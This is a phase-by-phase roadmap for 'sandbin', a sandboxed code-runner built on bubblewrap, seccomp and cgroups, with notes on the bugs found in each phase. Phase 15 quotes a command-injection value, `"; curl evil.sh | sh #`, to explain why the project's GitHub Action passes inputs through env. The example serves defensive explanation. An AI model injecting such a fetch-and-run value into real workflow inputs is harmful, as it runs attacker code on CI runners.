# sandbin roadmap

## Phase 0 — isolation core (done)

- bubblewrap: namespaces (pid, net, mount, ipc, uts, user), private tmpfs root
- cgroup v2: `memory.max`, `cpu.max`, `pids.max`, `cgroup.kill` teardown
- rlimits: file size, open descriptors, no core dumps
- wall-clock deadline enforced by the supervisor
- adversarial test suite, 14/14 contained

## Phase 1 — seccomp filter (done)

Namespaces stop a guest from reaching the host's files, network and processes.
They do nothing about a guest reaching the *kernel* through a syscall the
kernel itself mishandles. Seccomp is the layer that shrinks that surface.

- allowlist model: default `ERRNO(EPERM)`, explicit `ALLOW` per syscall needed
  by a Python or Bash script — not a blocklist of known-bad calls
- `clone` allowed for ordinary fork/thread use, denied when the flags request
  `CLONE_NEWUSER`, `CLONE_NEWNS`, `CLONE_NEWPID`, `CLONE_NEWNET`,
  `CLONE_NEWUTS`, `CLONE_NEWIPC` or `CLONE_NEWCGROUP` — blocks nested-namespace
  privilege escalation from inside an already-unprivileged sandbox
- `clone3` denied with `ENOSYS` specifically, so glibc's built-in fallback to
  `clone()` kicks in instead of the interpreter aborting on `EPERM`
- `unshare`, `setns`, `ptrace`, `mount`, `umount2`, `pivot_root`, `reboot`,
  `init_module`, `delete_module`, `bpf`, `perf_event_open`, `io_uring_setup`,
  `userfaultfd`, `keyctl`, `personality`, `iopl`, socket-family syscalls — all
  denied by omission from the allowlist
- filter compiled once via a small libseccomp-based generator, exported as raw
  BPF and handed to bubblewrap through `--seccomp FD`
- covers the native architecture plus the 32-bit compat and x32 ABIs, closing
  the classic "switch to a 32-bit syscall table the filter forgot" bypass
- adversarial tests extended: nested user namespace, raw `clone(CLONE_NEWUSER)`,
  ptrace, mount, io_uring, raw socket — each must fail — while subprocess,
  threading, and every Phase-0 case still pass. 23/23 contained.

## Phase 2 — job queue and concurrency (done)

- bounded worker pool: `maxConcurrency` caps how many sandboxed runs execute
  at once, everything past that queues in FIFO order
- per-key concurrency limit (`maxPerKey`) stands in for per-tenant / per-IP
  limits until there's an actual API layer with a real notion of caller
  identity — same mechanism, `key` is just a string for now
- `queuedMs` on every result, `position` returned synchronously at submit
  time, `stats()` for queue depth and running count
- backpressure: `maxQueueLength` rejects immediately with `queue_full` (or
  `key_limit`) once the backlog is full, rather than accepting unbounded
  work or shrinking every run's resource limits
- 6/6 functional cases, all against real spawned sandbox runs: concurrency
  actually observed to be bounded under load, backpressure fires exactly at
  capacity, a crashing job still frees its slot for the next one

## Phase 3 — streaming API (done)

- `POST /runs` submits a job to the queue and returns immediately with
  `{ accepted, runId, position }` (or a rejection, same as `queue.submit()`)
- `GET /runs/:id/stream` (WebSocket) delivers `queued` -> `started` ->
  `chunk` (repeated) -> `finished`, replaying whatever already happened if
  the client connects late, mid-run, or after the run is done
- `sandbox.mjs` gained `onChunk`/`onSpawn` hooks so the server can observe a
  run live without changing `run()`'s existing single-promise contract for
  callers that don't need streaming
- interactive stdin: a `{ type: 'stdin', text }` WebSocket message writes to
  the guest's stdin while it's still running, verified against a real
  `input()` call that blocks until the reply arrives
- found and fixed a real bug via the "chunks arrive incrementally" test:
  CPython fully buffers stdout when it isn't a TTY, so three separate
  `print()` calls arrived as one chunk at exit instead of three live ones.
  Fixed with `-u`. Would not have been caught without asserting on real
  wall-clock gaps between chunks, not just their final content.
- 7/7 functional cases against a real HTTP+WebSocket server on an ephemeral
  port, no mocks: incremental delivery, interactive stdin, backpressure over
  HTTP (429), bad input (400), reconnect-after-finish replay, unknown run id

## Phase 4 — per-language runtime images (done)

- Node.js added as a second interpreter, C as a compiled language — proves
  the design isn't interpreter-only
- Node's binary lives wherever the host happens to keep it (`mise`, `nvm`,
  a CI tool-cache directory, `/usr/bin` — no fixed location), so its path is
  resolved once at startup via `realpathSync(process.execPath)` — the exact
  binary already running sandbin itself — rather than assumed. Its install
  directory is read-only bind-mounted in alongside `/usr`
- C runs in two sandboxed phases, not one: `gcc` compiles under its own,
  more permissive resource profile (256 MB / 10 s, since compiling
  legitimately needs more of both than running a script does), and only on
  success does a second, separate sandboxed invocation execute the result
  under the caller's normal limits. A compile failure short-circuits before
  ever reaching the second phase and reports `compile_error` with the
  compiler's own diagnostic as `stderr`
- the compile phase's `/box` is mounted read-write (`--bind`, not
  `--ro-bind`) so `gcc` can write `a.out` — the only image that needs this;
  every execute-phase mount, and every other language, stays read-only
- three real bugs surfaced by actually running each new language, none of
  them visible from reading the code:
  - `gcc`/`ld` inside the sandbox produced `a.out` at mode `644`, not the
    normal `755` — executing it then failed with a plain permission error.
    The cause was `umask` itself being seccomp-denied (missing from the
    allowlist entirely, an oversight from the original policy, not a
    deliberate exclusion); denying a benign query syscall broke a subprocess
    three layers removed from the syscall that actually failed
  - Node produced clean exit code 0 with completely empty `stdout` — libuv
    probes any given stdio fd with `getsockopt`/`getsockname` to tell a pipe
    from a socket from a TTY, regardless of what the fd actually is, and
    with both seccomp-denied it apparently misdetected the stream type
    and silently dropped writes rather than erroring visibly. Both were
    intentionally absent as part of "deny the whole socket family" — adding
    them back is safe: they only read metadata about an fd the guest already
    holds, `socket()` itself (creating a new one) stays fully denied, and
    the "network blocked" adversarial case still passes
  - a sustained C memory bomb (write, then `sleep(3)`) is caught correctly
    (`memory_limit`, `oomKills: 1`), but the identical allocation without the
    sleep sometimes exits cleanly with a tiny reported peak. This isn't a
    sandbin bug: cgroup v2's `memory.max` attempts reclaim before escalating
    to an OOM kill, and a spike brief enough to finish and free itself before
    that escalation completes can legitimately slip through. True for any
    language, not just C — Python's earlier memory-bomb test only ever
    looked reliable because touching 512 MB in a loop takes measurably
    longer than one `memset`
- 32/32 adversarial cases, including per-language network and sustained
  memory checks for both new languages

## Phase 5 — frontend (done)

- single-page editor: language picker, code area, stdin box, run button —
  plain HTML/CSS/JS, no framework, no build step, no font or color beyond
  black, white and one gray for secondary text
- live output panel fed by the Phase 3 WebSocket; interactive stdin works
  through the same UI, verified against a real blocking `input()` call
- resource panel: verdict, duration, CPU time, peak memory, exit code — the
  numbers `sandbox.mjs` already computes, just rendered
- served as static files straight off `server.mjs` (`GET /`, `/styles.css`,
  `/app.js`) rather than deployed separately — there's one process to run,
  and nothing here needs a build step or a second server
- found two real bugs by actually clicking through it in a browser rather
  than trusting the API tests alone:
  - a run finishing before the WebSocket handshake completes (routine, given
    ~20ms cold starts) replays only a single `finished` message with no
    `chunk` events; the frontend rendered stats but never the buffered
    `stdout`/`stderr` from that message, so fast programs showed empty
    output. Fixed by falling back to the buffered result when no chunk was
    ever seen live.
  - the default 5s wall-clock limit is sized for automated submissions, not
    a human reading a prompt and typing a reply — a real interactive session
    routinely exceeds it. The frontend now requests `wallClockMs: 30000` for
    its own submissions; every other ceiling (memory, CPU, pids) is
    unaffected.
- no headless-browser test suite for this layer: the API it depends on
  (Phase 3) is already covered end to end, and Playwright/Puppeteer would be
  a heavy dependency for a three-file static page. Verified manually instead
  — basic run, incremental output, interactive stdin via both Enter and the
  send button, stderr styling. A gap worth naming, not hiding.

## Phase 6 — CI and publish (done)

- GitHub Actions runs all three suites (sandbox, queue, server) on every
  push and pull request, with a 5-minute job timeout so a genuine hang fails
  fast instead of consuming CI budget silently
- `bubblewrap`, `libseccomp-dev` and `gcc` installed explicitly in CI rather
  than assumed present on the runner image
- the runner needed two real fixes that were entirely about the environment,
  not sandbin's own code: Ubuntu 24.04's default-on AppArmor restriction on
  unprivileged user namespaces, and a cgroup hierarchy where the job's own
  cgroup lives under `system.slice` with resident processes rather than a
  process-free `user.slice` session — the second one is why `findDelegatedRoot`
  walks up looking for a process-free ancestor instead of assuming one
  fixed path. Documented in README's Requirements rather than special-cased
  quietly
- repository pushed to GitHub under a single author, `ayazdoruck`; every
  commit message states what broke and how it was actually found, not just
  what changed

## Phase 7 — live resource telemetry (done)

- `sandbox.mjs` gained an `onStats` hook alongside `onChunk`/`onSpawn`:
  while the guest runs, its cgroup's `memory.current` and `cpu.stat` are
  polled every 50 ms and handed to the caller as `{ t, memBytes, cpuMs }`,
  same shape and same hook pattern as the existing streaming callbacks —
  `run()`'s single-promise contract for non-streaming callers is untouched
- the server broadcasts each sample as a `stats` WebSocket message and
  buffers them per run, replayed alongside buffered chunks for anyone who
  connects mid-run — the exact same catch-up mechanism Phase 3 already
  built for `chunk`, extended rather than duplicated
- both frontends (the real playground and the docs site's recorded demo)
  draw the same thing from it: a canvas sparkline of live memory usage,
  revealed once a run starts and left showing the full trace once it ends
- deliberately no `pids.current` or dual-axis CPU line in v1 — one metric,
  drawn well, beats two metrics fighting for the same 72px of height
- honest about the gap this doesn't close: at a 50 ms poll interval, most
  sandbin runs (~20 ms median, see [Benchmarks](https://sandbin.vercel.app/benchmarks))
  finish before a single sample is taken. The graph is for the minority of
  runs that actually run long enough to have a story to tell — a tight
  memory loop, a deliberate `sleep`, an interactive session — not for the
  one-liners the whole project is fastest at. Verified with a real test
  that forces exactly that case: a loop that grows a `bytearray` with a
  `time.sleep()` between iterations, asserting on cgroup-reported
  `memory.current` actually increasing across samples, not on anything the
  guest claims about itself
- 46/46 tests passing (`test:server` gained one case, everything else
  unchanged)

## Phase 8 — shareable permalinks (done)

- every finished run is saved automatically, no opt-in: `src/permalinks.mjs`
  is a small disk-backed store (one JSON file per run, keyed by the same
  `runId` already returned by `POST /runs`) with no new dependency and no
  database — `save`/`load`/`sweep`, TTL-checked lazily on read and swept
  hourly, 30 days by default
- `GET /r/:runId` serves an HTML page that replays the run: the original
  code, the streamed output, and the resource graph, timed from the actual
  recorded `chunk`/`stats` timestamps rather than dumped instantly — a
  shared timeout run doesn't force a visitor to watch it in real time
  either, since each step's wait is capped at 800 ms. `GET /r/:runId/data`
  is the JSON it's built from
- a real ordering bug caught before it shipped, not after: the first version
  broadcast `finished` over the WebSocket and then fired off the permalink
  save without awaiting it. A client that fetched its own permalink the
  instant it saw `finished` — which is exactly what the playground's own
  "share this run" link invites someone to do — could race the write and
  get a 404 for a run that very much existed. Fixed by awaiting the save
  before broadcasting `finished` at all; a dedicated server test submits a
  run, waits for it to finish over the socket, and immediately fetches the
  permalink to prove the race is actually closed, not just less likely
- the id is an unguessable UUID: unlisted, not secret, the same trust model
  as a Gist or a paste link — sharing one shares exactly what was submitted
  and what it produced, nothing more, and nothing requires a login to see
- TTL correctness is tested against a real filesystem with an injected
  clock (`load(id, { now })`, `sweep({ now })`) rather than actually
  waiting 30 days or mocking the filesystem — new `test:permalinks` suite,
  5 cases, plus 3 new server-level cases covering the HTTP surface and the
  save-before-broadcast race specifically
- 54/54 tests passing across four suites

## Phase 9 — API keys and rate limits (done)

- two new, deliberately tiny modules, each doing one thing: `src/ratelimit.mjs`
  is a fixed-window counter (`check`/`peek`, per-id buckets, injectable
  clock), `src/apikeys.mjs` is a disk-backed key store (`issue`/`load`,
  same one-JSON-file-per-record pattern as `permalinks.mjs`) — no new
  dependency, no database, for either
- anonymous callers (keyed by IP) get 20 runs/hour; `POST /keys` issues a
  free `sb_`-prefixed key with a 200/hour quota, no signup; `GET /keys/:key`
  reports the current window without consuming it
- deliberately did not overload `X-Sandbin-Key`'s existing job: that header
  already partitions `maxPerKey` *concurrency* (Phase 2), a completely
  different axis from an hourly request *quota*. An arbitrary caller-chosen
  string still works for concurrency partitioning at the anonymous
  rate-limit tier exactly as before — it only unlocks the higher tier when
  it happens to match a key actually issued by `POST /keys`. Nothing about
  the existing documented header behavior changed
- key issuance is itself rate-limited by IP (5/hour) — the obvious hole in
  a "free API key, no signup" design is minting unlimited fresh keys to
  keep resetting your own quota, so the mint endpoint sits behind the same
  limiter it's handing out access to
- the rate-limit check runs first in `submitRun`, before language/code
  validation — a client hammering the endpoint with garbage payloads still
  gets throttled, not free retries because their request happened to be
  malformed
- tested at both layers: `test:ratelimit` (5 cases) and `test:apikeys`
  (5 cases) exercise the modules directly with independent ids and
  injected clocks; `test:server` adds 5 HTTP-level cases including the one
  that actually matters — a request carrying a real issued key succeeds
  even after the anonymous per-IP bucket for the same test client is
  already exhausted, proving the two tiers are genuinely separate buckets
  and not just a relabeled version of the same counter
- 69/69 tests passing across six suites

## Phase 10 — Go support (done), Rust attempted and shelved

- `go` joins `c` as the second compiled language, registered in `IMAGES`
  only when `go env GOROOT` actually resolves to something — the same
  "offer exactly what the host can do" principle Node's own binary
  resolution already established, extended to an entire language rather
  than just a binary path. A host without Go installed simply doesn't
  offer it; nothing breaks, nothing lies about being available
- toolchains managed by a version-switching shim (`mise`, `rustup`,
  `asdf`) don't live under `/usr` and the shim itself needs host state
  (config files, env vars) to pick a version — state that has no business
  being inside the sandbox. `resolveToolchain()` asks the shim once, on
  the host, for the real install root (`go env GOROOT`), and every
  sandboxed run binds that root in directly and execs the real binary,
  never the shim
- the interesting failure was resource, not security: `go build` on a
  cold cache means compiling the Go runtime and standard library from
  source, and that blew through the compile sandbox's `pids.max` (Go's
  own scheduler spawns OS threads for parallel compilation) and then its
  `ulimit -f` (an intermediate package archive for `runtime` itself
  landed over the file-size cap) — both real ceilings doing exactly what
  they're for, just sized for a one-file program compiling against an
  already-built stdlib, not building that stdlib from nothing. Capping
  `GOMAXPROCS=2` fixed the first; the second needed an actual persistent,
  shared, writable `GOCACHE` (`data/go-cache/`), warmed once with a
  trivial program *outside* the sandbox entirely (no ceilings, because
  there's nothing adversarial about compiling the standard library) the
  first time a Go-capable `sandbox.mjs` loads. Every real sandboxed
  compile after that only ever has its own small package left to build —
  verified empirically, not assumed: the same "hello world" compile went
  from failing on a cold cache to a 14 ms `ok` once the cache was warm,
  same limits, same everything else
- `net` alone, even after the cache was warm, still failed differently:
  Go's `net` package can fall back to `cgo` for name resolution, which
  means shelling out to `gcc` as a *second* compiler invocation from
  inside the first one — an entire extra layer of process spawning that
  has no reason to exist for a sandboxed guest that was never going to
  reach a real resolver anyway. `CGO_ENABLED=0` forces Go's own
  pure-Go resolver, which needed nothing from `gcc` and nothing extra
  from the sandbox once removed
- adversarial coverage added to `test:sandbox` follows the exact pattern
  Node and C already established — compile-and-run, a syntax error
  surfacing as `compile_error`, network blocked at the syscall level
  (`net.Dial` failing with the guest's own `EPERM`, not a timeout), and a
  sustained memory bomb caught by the cgroup, `oomKills > 0`. All four are
  wrapped in `IMAGES.go ? [...] : []` so the suite is still exactly right
  — neither inflated nor silently short — on a host without Go
- **Rust was attempted in the same pass and shelved, not shipped broken.**
  `rustc`, sandboxed, fails invoking its own linker (`cc`) with a bare
  `EPERM` — the *exact* symptom `POSIX_SPAWN_RESETIDS` produces when the
  `setuid`/`setgid`/`setresuid`/`setresgid` family is missing from the
  seccomp allowlist, which it was: an oversight, not a deliberate
  exclusion, in the same category as `umask` and `getsockopt` from Phase
  4 — a syscall family with no real security cost to allow (an
  unprivileged process calling `setuid()` on its own uid is a genuine
  no-op; the kernel's own permission check, not this filter, is what
  would actually stop anything more) but the fix, verified with an
  isolated reproduction via `os.posix_spawn(resetids=True)`, did not fix
  `rustc` itself. It's kept in the policy anyway — real, evidenced, and
  harmless — while the hunt for what `rustc` *actually* hits continued
  and came up short:
  - reproduced with an `LD_PRELOAD` shim interposing `fork`, `vfork`,
    `posix_spawn`, `posix_spawnp`, `execve`, and the raw `syscall()` entry
    point for the `clone`/`vfork`/`execve`/`clone3`/`execveat` numbers
    specifically — confirmed working (it catches `bash`'s own `fork`+`exec`
    of `cc` inside the identical sandbox, and catches `rustc`'s own spawn
    of `cc` when run *unsandboxed* on the host) but sees *nothing at all*
    from `rustc` the moment it runs sandboxed, right up to the same error
  - `AT_SECURE` (glibc's dynamic-linker secure-execution flag, which would
    explain `LD_PRELOAD` being silently ignored) checked directly via
    `getauxval(AT_SECURE)` inside the sandbox: 0, both as the direct exec
    target and via an inner shell — ruled out, not assumed
  - cgroup `pids.max`, `memory.max`, the compile sandbox's `ulimit -f`, and
    process/session-group leadership were each isolated and individually
    ruled out by direct reproduction with only that one variable changed
  - what's left, that would explain a real spawn attempt producing zero
    matches against *any* of `fork`/`vfork`/`posix_spawn`/`posix_spawnp`/
    `execve`/raw-`syscall`-for-those-numbers: `rustc` issuing the
    equivalent syscall through neither a named libc symbol nor libc's own
    generic `syscall()` entry point — e.g. an inlined raw syscall
    instruction compiled directly into `rustc`'s own binary. That's a real
    hypothesis, not a confirmed one, and confirming it needs kernel-level
    tracing (`strace`, or root for `auditd`/`ftrace`) that wasn't available
    where this was investigated
  - left out of `IMAGES` entirely rather than registered and silently
    broken. The setuid/setgid fix stays; `rust` stays absent until this is
    actually resolved, not worked around with a guess
- 73/73 tests passing across six suites (`test:sandbox` gained the four
  Go cases; everything else unchanged)

## Phase 11 — `sandbin` CLI (done)

- a real `bin/sandbin.mjs`, wired up as `package.json`'s `bin` entry so
  `npm link` gives a `sandbin` on `PATH`. Two modes, one interface:
  **local**, which imports `sandbox.mjs` directly and calls `run()` with no
  server involved at all, and **remote** (`--server <url>`), which speaks
  the exact HTTP + WebSocket protocol the browser frontend already speaks
  — `POST /runs`, then stream `/runs/:id/stream` — so the CLI is a second,
  independent client against the same API surface rather than a special
  path of its own
- local is the default on purpose, not remote: the more common case for
  someone who already has the repo checked out is "run this one file
  through the real sandbox right now," which needs nothing running and no
  port to pick. `--server` (or `SANDBIN_SERVER`) switches the same command
  over to hitting a sandbin instance running somewhere else, local or not
- language is inferred from the file extension (`.py`, `.sh`/`.bash`,
  `.js`/`.mjs`/`.cjs`, `.c`, `.go`) when a file is given, with `-l` to
  override or supply it outright for `-e`/stdin input. Code can come from
  a file, `-e/--eval`, or piped stdin — deliberately not from more than
  one of those in the same invocation, no ambiguity about which wins
- output streams live, stdout and stderr each to their own real stream, as
  `chunk` events arrive — both in local mode (`onChunk` wired straight
  into `run()`) and remote mode (the same WebSocket `chunk` messages the
  frontend already renders). `--json` turns this off and prints the whole
  result object instead, once, for scripting
- one real gap found writing the adversarial test for it, not by
  inspection: `run()`'s `onChunk` only ever covers the *execute* phase —
  the compile phase (`c`, `go`) never gets the callback at all (see
  `sandbox.mjs`'s two `spawnInSandbox` calls in `run()`). A compile
  failure was streaming nothing and then printing a bare
  `verdict compile_error` with zero indication of what the compiler
  actually said — technically correct, practically useless. Fixed by
  printing the result's own captured `stderr` in full for exactly the two
  verdicts where the streamed callback wouldn't have shown it
  (`compile_error`, `setup_failed`) — not a change to `sandbox.mjs`, the
  result already carried the diagnostic, the CLI just wasn't showing it
- exit code is `0` for verdict `ok`, `1` for anything else — deliberately
  *not* a passthrough of the guest's own exit code (a guest exiting `3`
  still means the sandbin CLI invocation itself succeeded at running it
  and observing that; the verdict, printed to stderr alongside duration,
  CPU and peak memory, is what actually failed). Kept scriptable: no
  interactive stdin forwarding in this pass, `-i/--stdin <file>` (or `-`
  for the CLI's own stdin, mutually exclusive with reading code from
  stdin) covers the fixed-input case the API itself supports
- `sandbin languages` and `sandbin keys create`/`keys status` round out
  the surface — the first reads local `IMAGES` directly (so it reflects
  this exact host, `go` included only if a toolchain was actually found),
  the second two are thin wrappers over the existing `POST /keys` and
  `GET /keys/:key` endpoints, no new server-side surface added for either
- tested as a real subprocess, not by importing its functions — `cli-test.mjs`
  spawns the actual `bin/sandbin.mjs` with `node`, both against `run()`
  directly (local) and against a real `createServer()` on an ephemeral
  port (remote), and asserts on captured stdout/stderr/exit code exactly
  the way a real caller would observe them, including the guest-exit-3
  case and the compile-error-shows-diagnostic fix above
- 83/83 tests passing across seven suites (`test:cli`, 10 cases, is new;
  everything else unchanged)

## Phase 12 — `/metrics` dashboard (done)

- a live view of the server process itself: `GET /metrics` (HTML,
  black-and-white, matching the existing frontend) polls
  `GET /metrics/data` (JSON) every two seconds and renders submitted /
  accepted / rejected counts, finished runs broken down by verdict and by
  language, average duration / CPU / peak memory across finished runs,
  the live queue's running/waiting depth, and how many API keys have been
  issued
- counters live entirely in memory (`src/metrics.mjs`, a handful of plain
  objects and a `snapshot()` call) and reset on restart — deliberately not
  persisted, the same "no database" stance the rest of the project already
  takes for the queue and rate limiter. The one exception, permalinks, is
  already opt-out-proof and disk-backed for a real reason (a shareable
  link has to survive the process that created it); a metrics counter
  answering "how's this instance doing right now" doesn't need to
  survive a restart to do its job
- deliberately not a new subsystem bolted alongside the server — every
  counter increments at a point `server.mjs` was already handling: a
  submission (`recordSubmitted`), a rejection with its actual verdict
  (`rate_limited`, `bad_request`, `queue_full`, `key_limit`, whichever
  `submitRun` was already about to return), an accepted run
  (`recordAccepted`), a finished run's real result once `ticket.result`
  resolves (`recordFinished`, verdict + language + duration/cpu/peak from
  the same object the WebSocket `finished` message already carries), and
  a successful `POST /keys` (`recordKeyIssued`). The live running/waiting
  numbers aren't tracked a second time at all — `queue.stats()` already
  existed (`queue-test.mjs` has exercised it since Phase 2) and is reused
  as-is rather than duplicating state that would just as easily drift out
  of sync with the real queue
- tested at two levels, matching how `apikeys.mjs`/`ratelimit.mjs` are
  already tested: `metrics-test.mjs` covers the counters in isolation (a
  fresh store is all zeros, accepted/rejected/finished stay independent
  and correctly broken down, averages are computed as a real mean rather
  than accumulated, uptime advances with real wall-clock time) and two
  cases added to `server-test.mjs` hit `GET /metrics/data` on a real
  server after real runs and a real rejection, asserting the numbers that
  come back match what was actually just done — not just that the route
  returns 200
- verified in a real browser, not just over the API: started the server,
  drove several real runs and a rejection through `curl`, loaded
  `/metrics` and confirmed every section rendered with the right numbers,
  then submitted one more run and watched the page's own 2-second poll
  pick it up with no manual reload
- 91/91 tests passing across eight suites (`test:metrics`, 6 cases, and
  two new cases in `test:server`; everything else unchanged)

## Phase 13 — Basic Auth on `/metrics` (done)

- the dashboard added in Phase 12 was open by default, which is fine for
  a local clone and wrong for anything a stranger can reach: rejection
  counts, per-language usage, and exactly how many API keys have been
  issued are real operational detail, not something to hand out for free
- `SANDBIN_METRICS_USER` + `SANDBIN_METRICS_PASS`, both required to
  enable, gate both `GET /metrics` and `GET /metrics/data` behind HTTP
  Basic Auth (`metricsAuth: { user, pass }` on `createServer()`,
  test-injectable the same way `permalinkDir`/`apiKeyDir` already are).
  Unset — the default — keeps today's open behavior, logged plainly at
  startup (`/metrics is open — set SANDBIN_METRICS_USER and
  SANDBIN_METRICS_PASS...`) rather than silently
- Basic Auth specifically because it needed zero frontend changes: the
  browser's own native credential prompt handles `/metrics` the moment
  the server returns `401` with `WWW-Authenticate: Basic`, and
  `curl -u user:pass` handles `/metrics/data` — no login page, no token
  storage, no JS to write or maintain
- four cases added to `server-test.mjs`, each spinning up a real server
  with `metricsAuth` configured: no credentials → 401 with the
  `WWW-Authenticate` header present, wrong credentials → 401 (not
  silently treated as "no auth configured"), correct credentials → 200
  with real data, and the HTML page gated exactly like the JSON route
  rather than just the data endpoint
- 95/95 tests passing across eight suites (`test:server` gained the four
  auth cases; everything else unchanged)

## Phase 14 — real load/concurrency benchmark (done)

- `src/loadtest.mjs` (`npm run loadtest`) spins up a real
  `createServer()` on an ephemeral port — no mocks — and drives it
  exactly the way a real client would: `POST /runs`, then a WebSocket
  connection per accepted run waiting for its `finished` message. Two
  scenarios, chosen to answer two different questions the cold-start
  comparison never could:
  - **Sustained, at the default concurrency limit** — 100 requests,
    client concurrency held at 4 (the queue's own default
    `maxConcurrency`), so nothing ever sits in the backlog. Stable
    across repeated runs: 119–132 req/s, p50 27–32ms, p95 46–48ms, 0
    rejections
  - **Overload, past capacity** — 60 requests fired at once with zero
    client-side throttling, against a queue deliberately shrunk to a
    20-slot capacity (`maxConcurrency=4` + `maxQueueLength=16`).
    `maxPerKey` raised out of the way first, specifically to isolate the
    *global* `queue_full` path from the *per-key* `key_limit` path
    (already its own dedicated case in `queue-test.mjs`) rather than
    conflating the two
- one confound found and removed before the numbers meant anything:
  every request in both scenarios shares one loopback IP, which would
  trip the real 20/hour anonymous rate limit within the first second and
  make the *rate limiter* the thing being measured instead of the queue.
  `createServer({ anonymousRequestsPerHour: 100_000, ... })` — already a
  constructor option, added for exactly this kind of test injection back
  in Phase 9 — removes it as a variable without touching the rate
  limiter itself
- the overload scenario's own result is the more interesting finding:
  **exactly 20 accepted on every single run** — the queue's accounting
  under real concurrent arrival is precise, not approximate — and **all
  40 rejections landed as `queue_full`, never `key_limit`**, confirming
  the isolation actually worked rather than assuming it did. Rejections
  also resolved in 36–62ms against accepted runs' 139ms median — a
  caller finds out it was turned away about as fast as one that got
  accepted starts running, not after being left waiting
- run three times before writing anything down, specifically to check
  the numbers weren't a one-off fluke before they went into
  `docs/benchmarks.html`'s new "Concurrency and throughput" section
  alongside the existing cold-start comparison, with the same
  methodology/reproduce-it structure the rest of that page already uses
- deliberately not part of `npm test` — it measures performance, not
  correctness, and belongs alongside the existing benchmarks rather than
  gating CI on wall-clock numbers that will legitimately vary by machine

## Phase 15 — GitHub Action (done)

- `action.yml` at the repo root, a composite action so any workflow can
  do `uses: ayazdoruck/sandbin@main` and get a real sandboxed run as a
  step — inputs mirror the CLI's own flags (`code`/`code-file`,
  `language`, `stdin`, the four limit overrides, `fail-on-error`),
  outputs are `verdict`/`exit-code`/`stdout`/`stderr`
- installs exactly what this project's own CI already installs
  (`bubblewrap`, `libseccomp`, `gcc`, `golang-go` only when
  `language: go`, the AppArmor unprivileged-userns sysctl) rather than
  inventing a second set of host requirements — same Ubuntu-family-runner
  assumption as everywhere else in this repo
- the one thing that got real security attention rather than being
  written on autopilot: every user-supplied input that flows into a
  `run:` step is passed through `env:`, never interpolated directly into
  the script text. Directly interpolating `${{ inputs.code }}` into a
  `run:` block is a well-known Actions injection class — the input value
  becomes part of the script GitHub actually executes, so `code`
  containing something like `"; curl evil.sh | sh #` would run on the
  runner before sandbin ever got a chance to sandbox anything. Getting
  this wrong specifically here — in the action whose entire purpose is
  running untrusted input safely — would have undermined the whole point
- output parsing avoids shell string-munging entirely: the CLI's own
  `--json` result is read and turned into `$GITHUB_OUTPUT` entries by a
  small inline Node script (`node --input-type=module -e '...'`), using
  a randomly generated heredoc delimiter for the multi-line
  `stdout`/`stderr` outputs per GitHub's own documented format, rather
  than a fragile `grep`/`jq` pipeline
- verified two ways: every step's shell/Node logic was extracted and run
  by hand locally first (`GITHUB_OUTPUT` pointed at a real temp file,
  `github.action_path` at the repo root) against a success case, a
  `fail-on-error: true` failure case, and a `fail-on-error: false` one —
  confirming the exact `$GITHUB_OUTPUT` contents and exit codes before
  any of it went near a real workflow. `.github/workflows/action-test.yml`
  is the real test: it uses `./` (this repo, checked out by the workflow
  itself) as the action and asserts on the same three cases end to end,
  running on every push same as `ci.yml`
- what local hand-testing can't cover: whether `uses: ./` and
  `github.action_path` resolve the way the composite-action docs say
  they will inside an actual Actions runner. That only gets proven by
  the real workflow run this repo's own CI now performs on every push —
  the same trust boundary this project already accepts for `ci.yml`
  itself, which was never re-run locally either

## What's left

Closing real gaps rather than adding breadth for its own sake, roughly in
the order they're worth doing:

- **A dedicated CLI docs page.** `sandbin.vercel.app` documents
  `/metrics` (folded into the API page) but the CLI itself is still only
  in `README.md`, not on the deployed site — everything else got folded
  into an existing page; the CLI is arguably substantial enough to
  warrant its own.
- **Embeddable widget.** A small script + iframe another site could drop
  in to embed a working sandbin playground, reusing the existing
  streaming API rather than building a second one.
- **Rust, revisited.** Still shelved from Phase 10 — the actual blocker
  was diagnostic, not architectural: confirming the hypothesis (`rustc`
  issuing a raw syscall no libc entry point catches) needs `strace` or
  root-level tracing that wasn't available where this was investigated.
  Worth another pass specifically if that access becomes available, not
  worth guessing at a fix without it.

Deliberately *not* on this list: horizontal scaling / multi-instance
support. That would mean moving the queue, rate limiter and metrics off
in-process state and onto something shared (Redis or equivalent) — a real
architectural shift away from "single process, no database, no external
dependency beyond `ws`," which is a stated design choice here, not an
oversight. Worth reconsidering only if this ever needs to run as more
than one process for real, not preemptively.
